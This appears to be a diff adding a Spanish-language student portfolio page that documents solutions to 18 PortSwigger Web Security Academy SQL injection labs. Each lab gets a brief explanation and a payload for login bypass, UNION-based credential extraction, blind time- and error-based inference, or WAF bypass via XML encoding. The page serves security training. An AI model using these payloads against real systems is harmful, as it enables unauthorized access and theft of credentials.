@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta content="IE=edge" http-equiv="X-UA-Compatible">
+  <meta content="width=device-width,initial-scale=1" name="viewport">
+  <meta content="description" name="description">
+  <meta name="google" content="notranslate" />
+
+  <!-- Disable tap highlight on IE -->
+  <meta name="msapplication-tap-highlight" content="no">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="./assets/apple-icon-180x180.png">
+  <link href="./assets/favicon.ico" rel="icon">
+
+  <title>ROAD TO HALL OF FAME - SQL Injection</title>
+
+  <link href="./main.3f6952e4.css" rel="stylesheet">
+
+  <!-- Estilos personalizados para tema oscuro con tonos azules (cyber/security theme) -->
+  <style>
+    /* Fondo oscuro azul para el body (cyber-inspired) */
+    body {
+      background-color: #0d1117;
+      /* Azul muy oscuro, como fondo de terminal */
+      color: #f0f0f0;
+      /* Texto claro para legibilidad */
+    }
+
+    /* Ajustes para encabezados (h1, h2, etc.) */
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+      color: #ffffff;
+      /* Blanco para destacar */
+    }
+
+    /* Forzar blanco en títulos con clase .h2 (como <h1 class="h2">) */
+    h1.h2,
+    h2.h2,
+    h3.h2,
+    h4.h2,
+    h5.h2,
+    h6.h2 {
+      color: #ffffff !important;
+      /* Blanco forzado para estos títulos */
+    }
+
+    /* Ajustes para párrafos y texto general */
+    p,
+    li,
+    label {
+      color: #e0e0e0;
+      /* Gris claro */
+    }
+
+    /* Enlaces: tonos azules para tema de seguridad */
+    a {
+      color: #79c0ff;
+      /* Azul claro */
+    }
+
+    a:hover {
+      color: #58a6ff;
+      /* Azul más brillante en hover */
+    }
+
+    /* Navbar: fondo azul oscuro y texto claro */
+    .navbar {
+      background-color: #21262d;
+      /* Azul grisáceo oscuro */
+      border-bottom: 1px solid #30363d;
+      /* Borde azul sutil */
+    }
+
+    .navbar-nav li a {
+      color: #f0f0f0;
+    }
+
+    .navbar-nav li a:hover {
+      color: #58a6ff;
+      /* Azul en hover */
+    }
+
+    /* Footer: fondo azul oscuro */
+    .footer-container {
+      background-color: #21262d;
+      color: #e0e0e0;
+      border-top: 1px solid #30363d;
+    }
+
+    .footer-container a {
+      color: #79c0ff;
+    }
+
+    .footer-container a:hover {
+      color: #58a6ff;
+    }
+
+    /* Bordes del sitio: azules oscuros para tema cyber */
+    #site-border-left,
+    #site-border-right,
+    #site-border-top,
+    #site-border-bottom {
+      background-color: #161b22;
+      /* Azul grisáceo */
+    }
+
+    /* Ajustes para secciones: fondo azul oscuro para contraste */
+    .section-container {
+      background-color: #161b22;
+      /* Azul grisáceo oscuro */
+      padding: 40px;
+      /* Más padding para mejor espaciado */
+      border-radius: 10px;
+      /* Bordes más redondeados */
+      border: 1px solid #30363d;
+      /* Borde sutil azul */
+      margin-bottom: 20px;
+    }
+
+    /* Botón de toggle en navbar: azul */
+    .navbar-toggle .icon-bar {
+      background-color: #79c0ff;
+    }
+
+    /* Tabla mejorada: headers destacados, filas alternas, hover */
+    .table {
+      background-color: #21262d;
+      color: #f0f0f0;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      /* Bordes redondeados */
+      overflow: hidden;
+      /* Para que los bordes se vean bien */
+      width: 100%;
+      margin-top: 20px;
+    }
+
+    .table th {
+      background-color: #161b22;
+      /* Azul más oscuro para headers */
+      color: #ffffff;
+      font-weight: bold;
+      padding: 15px;
+      /* Más padding */
+      text-align: left;
+      border-bottom: 2px solid #58a6ff;
+      /* Borde azul brillante */
+    }
+
+    .table td {
+      padding: 15px;
+      /* Más padding para legibilidad */
+      border-bottom: 1px solid #30363d;
+      vertical-align: top;
+      /* Alineación superior para texto largo */
+    }
+
+    .table tr:nth-child(even) {
+      background-color: #1a1f26;
+      /* Filas pares ligeramente más oscuras */
+    }
+
+    .table tr:hover {
+      background-color: #58a6ff;
+      /* Azul brillante en hover */
+      color: #ffffff;
+      /* Texto blanco en hover */
+    }
+
+    .table-bordered {
+      border: 1px solid #30363d;
+    }
+
+    /* Espaciado para secciones */
+    .section-container-spacer {
+      margin-bottom: 30px;
+    }
+
+    /* Roadmap Timeline Styles */
+    .roadmap {
+      position: relative;
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 40px 0;
+    }
+
+    .roadmap::after {
+      content: '';
+      position: absolute;
+      width: 4px;
+      background-color: #30363d;
+      top: 0;
+      bottom: 0;
+      left: 50%;
+      margin-left: -2px;
+    }
+
+    .roadmap-item {
+      padding: 10px 40px;
+      position: relative;
+      background-color: inherit;
+      width: 50%;
+    }
+
+    .roadmap-item::after {
+      content: '';
+      position: absolute;
+      width: 25px;
+      height: 25px;
+      right: -12.5px;
+      background-color: #0d1117;
+      border: 4px solid #58a6ff;
+      top: 15px;
+      border-radius: 50%;
+      z-index: 1;
+    }
+
+    .left {
+      left: 0;
+    }
+
+    .right {
+      left: 50%;
+    }
+
+    .left::before {
+      content: " ";
+      height: 0;
+      position: absolute;
+      top: 22px;
+      width: 0;
+      z-index: 1;
+      right: 30px;
+      border: medium solid #21262d;
+      border-width: 10px 0 10px 10px;
+      border-color: transparent transparent transparent #21262d;
+    }
+
+    .right::before {
+      content: " ";
+      height: 0;
+      position: absolute;
+      top: 22px;
+      width: 0;
+      z-index: 1;
+      left: 30px;
+      border: medium solid #21262d;
+      border-width: 10px 10px 10px 0;
+      border-color: transparent #21262d transparent transparent;
+    }
+
+    .right::after {
+      left: -12.5px;
+    }
+
+    .roadmap-content {
+      padding: 20px 30px;
+      background-color: #21262d;
+      position: relative;
+      border-radius: 8px;
+      border: 1px solid #30363d;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .roadmap-content:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+      border-color: #58a6ff;
+    }
+
+    .roadmap-content h2 {
+      margin-top: 0;
+      color: #58a6ff;
+      font-size: 1.5em;
+    }
+
+    .roadmap-content p {
+      margin-bottom: 15px;
+      font-size: 1.1em;
+      line-height: 1.6;
+    }
+    
+    .roadmap-badge {
+      display: inline-block;
+      padding: 5px 10px;
+      border-radius: 4px;
+      font-size: 0.85em;
+      font-weight: bold;
+      margin-bottom: 15px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .badge-apprentice {
+      background-color: #238636;
+      color: #ffffff;
+    }
+    
+    .badge-practitioner {
+      background-color: #d29922;
+      color: #ffffff;
+    }
+    
+    .badge-expert {
+      background-color: #da3633;
+      color: #ffffff;
+    }
+
+    .evidence-image {
+      max-width: 100%;
+      height: auto;
+      border-radius: 5px;
+      border: 1px solid #30363d;
+      margin-top: 10px;
+      display: block;
+    }
+
+    @media screen and (max-width: 768px) {
+      .roadmap::after {
+        left: 31px;
+      }
+      .roadmap-item {
+        width: 100%;
+        padding-left: 70px;
+        padding-right: 25px;
+      }
+      .roadmap-item::before {
+        left: 60px;
+        border: medium solid #21262d;
+        border-width: 10px 10px 10px 0;
+        border-color: transparent #21262d transparent transparent;
+      }
+      .left::after, .right::after {
+        left: 18.5px;
+      }
+      .right {
+        left: 0%;
+      }
+    }
+    
+    .download-btn {
+      display: inline-block;
+      background-color: #238636;
+      color: #ffffff;
+      padding: 12px 24px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 1.1em;
+      transition: background-color 0.2s ease;
+      margin-top: 20px;
+      border: 1px solid rgba(240, 246, 252, 0.1);
+    }
+    
+    .download-btn:hover {
+      background-color: #2ea043;
+      color: #ffffff;
+      text-decoration: none;
+    }
+  </style>
+</head>
+
+<body class="">
+  <div id="site-border-left"></div>
+  <div id="site-border-right"></div>
+  <div id="site-border-top"></div>
+  <div id="site-border-bottom"></div>
+  <!-- Add your content of header -->
+  <header>
+    <nav class="navbar  navbar-fixed-top navbar-default">
+      <div class="container">
+        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse"
+          aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+          <ul class="nav navbar-nav ">
+            <li><a href="./index.html" title="">01 : Inicio</a></li>
+            <li><a href="./presentacion.html" title="">02 : Presentación</a></li>
+            <li><a href="./TPT.html" title="">03 : Actividades</a></li>
+            <li><a href="./contacto.html" title="">04 : Contacto</a></li>
+            <li><a href="./informacion.html" title="">05 : Información</a></li>
+            <li><a href="./proyectos.html" title="">06 : Proyectos</a></li>
+            <li class="dropdown">
+              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" title="">07 : ROAD TO HALL OF FAME <span class="caret"></span></a>
+              <ul class="dropdown-menu" style="background-color: #21262d;">
+                <li><a href="./sql_injection.html" style="color: #79c0ff;">SQL Injection</a></li>
+              </ul>
+            </li>
+          </ul>
+
+
+        </div>
+      </div>
+    </nav>
+  </header>
+
+  <div class="section-container">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-8 col-md-offset-2"> <!-- Centrado y más ancho para mejor layout -->
+
+          <div>
+            <h1></h1>
+          </div>
+          <div class="section-container-spacer text-center">
+            <h1 class="h2">ROAD TO HALL OF FAME</h1>
+            <p style="font-size: 1.2em; max-width: 800px; margin: 0 auto; margin-bottom: 20px;">
+              Este módulo documenta el análisis técnico y resolución sistémica de los 18 laboratorios oficiales de PortSwigger Web Security Academy sobre SQL Injection.
+            </p>
+            <a href="./actividades/Act08_Equipo1.pdf" download class="download-btn">Descargar Documento Completo (PDF)</a>
+          </div>
+
+          <div class="roadmap">
+            <!-- Lab 1 -->
+            <div class="roadmap-item left">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-apprentice">Apprentice</span>
+                <h2>1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
+                <p><strong>Tipo:</strong> In-band (cláusula WHERE)</p>
+                <p><strong>Explicación:</strong> Ocurre porque el input del usuario en el parámetro category se concatena directamente en una consulta WHERE. Permite romper la lógica booleana original insertando una condición (1=1).</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: ' OR 1=1--
+                </div>
+              </div>
+            </div>
+
+            <!-- Lab 2 -->
+            <div class="roadmap-item right">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-apprentice">Apprentice</span>
+                <h2>2. SQL injection vulnerability allowing login bypass</h2>
+                <p><strong>Tipo:</strong> In-band (Autenticación)</p>
+                <p><strong>Explicación:</strong> Mecanismo de autenticación vulnerable a la manipulación de consulta de login. Se comenta la verificación de password engañando al servidor para validar con solo el nombre de usuario.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: administrator'--
+                </div>
+              </div>
+            </div>
+
+            <!-- Lab 3 -->
+            <div class="roadmap-item left">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-practitioner">Practitioner</span>
+                <h2>3. SQL injection attack, querying the database type and version on Oracle</h2>
+                <p><strong>Tipo:</strong> In-band (UNION-based)</p>
+                <p><strong>Explicación:</strong> Ataque de unión para extraer metadatos de versión en Oracle. Oracle requiere estructura UNION precisa y el uso de la tabla `v$version` para obtener el banner del sistema.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: ' UNION SELECT banner, NULL FROM v$version--
+                </div>
+              </div>
+            </div>
+
+            <!-- Lab 4 -->
+            <div class="roadmap-item right">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-practitioner">Practitioner</span>
+                <h2>4. SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
+                <p><strong>Tipo:</strong> UNION-based SQL Injection</p>
+                <p><strong>Explicación:</strong> Extrae la cadena que describe la versión mediante inyección basada en unión, que requiere mismo número de columnas y tipos compatibles.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: ' UNION SELECT @@version, NULL#
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 5 -->
+            <div class="roadmap-item left">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-practitioner">Practitioner</span>
+                <h2>5. SQL injection attack, listing the database contents on non-Oracle databases</h2>
+                <p><strong>Tipo:</strong> UNION-based SQL Injection</p>
+                <p><strong>Explicación:</strong> Enumeración del catálogo `information_schema` en PostgreSQL para reconstruir la estructura de la base de datos, extraer nombre de tabla y columnas hasta conseguir credencial.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: ' UNION SELECT username_ifjekb, password_enyhpp FROM users_faborn--
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 6 -->
+            <div class="roadmap-item right">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-practitioner">Practitioner</span>
+                <h2>6. SQL injection attack, listing the database contents on Oracle</h2>
+                <p><strong>Tipo:</strong> UNION-based SQL Injection</p>
+                <p><strong>Explicación:</strong> Enumeración de metadatos en Oracle a través de `all_tables` y `all_tab_columns` en lugar de information_schema, respetando el uso necesario de SELECT estricto en mayúsculas.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: ' UNION SELECT USERNAME_OCIROF, PASSWORD_CAPDCE FROM USERS_GGYPYC--
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 7 -->
+            <div class="roadmap-item left">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-apprentice">Apprentice</span>
+                <h2>7. SQL injection UNION attack, determining the number of columns returned by the query</h2>
+                <p><strong>Tipo:</strong> In-band (Union-based)</p>
+                <p><strong>Explicación:</strong> Determina la cantidad de columnas requerida sumando `NULL`s hasta obtener un response sin error.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: ' UNION SELECT NULL, NULL, NULL--
+                </div>
+              </div>
+            </div>
+
+            <!-- Lab 8 -->
+            <div class="roadmap-item right">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-apprentice">Apprentice</span>
+                <h2>8. SQL injection UNION attack, finding a column containing text</h2>
+                <p><strong>Tipo:</strong> In-band (Union-based)</p>
+                <p><strong>Explicación:</strong> Tras hallar la cantidad de columnas, se inyecta tipo cadena y visualiza si el sistema la renderiza. Se localiza qué columna maneja string.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: ' UNION SELECT NULL, 'tj2vPi', NULL--
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 9 -->
+            <div class="roadmap-item left">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-apprentice">Apprentice</span>
+                <h2>9. SQL injection UNION attack, retrieving data from other tables</h2>
+                <p><strong>Tipo:</strong> In-band (Union-based)</p>
+                <p><strong>Explicación:</strong> Exfiltrar los nombres de usuario y contraseñas de la tabla users y utilizarlos para iniciar sesión como administrador.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: ' UNION SELECT username, password FROM users--
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 10 -->
+            <div class="roadmap-item right">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-apprentice">Apprentice</span>
+                <h2>10. SQL injection UNION attack, retrieving multiple values in a single column</h2>
+                <p><strong>Tipo:</strong> In-band (Union-based)</p>
+                <p><strong>Explicación:</strong> Si solo una columna procesa strings, se concatenan ambos valores de usuario y contraseña separados por símbolo.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: UNION SELECT NULL, username || ':' || password FROM users--
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 11 -->
+            <div class="roadmap-item left">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-apprentice">Apprentice</span>
+                <h2>11. Blind SQL injection with conditional responses</h2>
+                <p><strong>Tipo:</strong> Blind SQL injection</p>
+                <p><strong>Explicación:</strong> Infiere información en base a un comportamiento de la interfaz como mensaje "Welcome back", permitiendo adivinar contraseña carácter a carácter con SUBSTRING.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: ' AND (SELECT SUBSTRING(password, ..., 1) FROM users WHERE username = 'administrator') = '...'--
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 12 -->
+            <div class="roadmap-item right">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-apprentice">Apprentice</span>
+                <h2>12. Blind SQL injection with conditional errors</h2>
+                <p><strong>Tipo:</strong> Blind SQL injection</p>
+                <p><strong>Explicación:</strong> Se explota generando errores controlados (división por cero) de la base de datos originando códigos de estado 500 para corroborar veracidad.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: ' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'a') THEN 1/0 ELSE '' END FROM users WHERE username='administrator') || '
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 13 -->
+            <div class="roadmap-item left">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-practitioner">Practitioner</span>
+                <h2>13. Visible error-based SQL injection</h2>
+                <p><strong>Tipo:</strong> In-band (Error-based)</p>
+                <p><strong>Explicación:</strong> Utiliza el CAST malicioso en la cookie intentando forzar la lectura del password entero como integer, el error resultante muestra el dato en crudo en la interfaz.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 14 -->
+            <div class="roadmap-item right">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-practitioner">Practitioner</span>
+                <h2>14. Blind SQL injection with time delays</h2>
+                <p><strong>Tipo:</strong> Inferential SQLi (Time-based)</p>
+                <p><strong>Explicación:</strong> El punto de entrada es tracking cookie con peticiones síncronas que retienen respuesta. Se fuerza usar funciones como pg_sleep(10).</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: TrackingId=x'||pg_sleep(10)--
+                </div>
+              </div>
+            </div>
+
+            <!-- Lab 15 -->
+            <div class="roadmap-item left">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-practitioner">Practitioner</span>
+                <h2>15. Blind SQL injection with time delays and information retrieval</h2>
+                <p><strong>Tipo:</strong> Inferential SQLi (Time-based)</p>
+                <p><strong>Explicación:</strong> Usa el tiempo de respuesta como métrica combinando pg_sleep y condicionales CASE WHEN de las posiciones de SUBSTRING logrando fuerza bruta por tiempo.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 16 -->
+            <div class="roadmap-item right">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-practitioner">Practitioner</span>
+                <h2>16. Blind SQL injection with out-of-band interaction</h2>
+                <p><strong>Tipo:</strong> Out-of-band SQL Injection</p>
+                <p><strong>Explicación:</strong> Provoca resolución DNS en server de la base de datos en Oracle con vulnerabilidad OAST para interactuar con dominios externos usando EXTRACTVALUE y xmltype.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: x' UNION SELECT EXTRACTVALUE(...) FROM dual--
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 17 -->
+            <div class="roadmap-item left">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-practitioner">Practitioner</span>
+                <h2>17. Blind SQL injection with out-of-band data exfiltration</h2>
+                <p><strong>Tipo:</strong> Out-of-band SQL Injection</p>
+                <p><strong>Explicación:</strong> Exfiltra la contraseña unida a una URL de petición externa controlada por el atacante en la cláusula SELECT EXTRACTVALUE.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: XML Entity Injection with SQL logical subqueries
+                </div>
+              </div>
+            </div>
+            
+            <!-- Lab 18 -->
+            <div class="roadmap-item right">
+              <div class="roadmap-content">
+                <span class="roadmap-badge badge-practitioner">Practitioner</span>
+                <h2>18. SQL injection with filter bypass via XML encoding</h2>
+                <p><strong>Tipo:</strong> WAF Bypass</p>
+                <p><strong>Explicación:</strong> Evade el Web Application Firewall en un endpoint XML mediante la ofuscación codificada en hexadecimales `&#x55;NION` evitando detecciones WAF.</p>
+                <div style="background-color: #0d1117; padding: 10px; border-radius: 5px; font-family: monospace; color: #58a6ff; margin-bottom: 10px;">
+                  Payload: 1 &amp;#x55;NION &amp;#x53;ELECT username || '~' || password FROM users--
+                </div>
+              </div>
+            </div>
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="footer-container text-center">
+    <div class="container">
+      <div class="row">
+        <div class="col-xs-12">
+          <p>© 2026 Pedro Jasso (AKKU) | Universidad Politécnica De San Luis Potosí | <a href="./presentacion.html"
+              title="">Presentación</a> | <a href="./contacto.html" title="">Contacto</a></p>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function (event) {
+      navActivePage();
+    });
+  </script>
+
+  <!-- Google Analytics: change UA-XXXXX-X to be your site's ID 
+
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date(); a = s.createElement(o),
+      m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+  })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+  ga('create', 'UA-XXXXX-X', 'auto');
+  ga('send', 'pageview');
+</script>
+
+-->
+  <script type="text/javascript" src="./main.70a66962.js"></script>
+</body>
+
+</html>
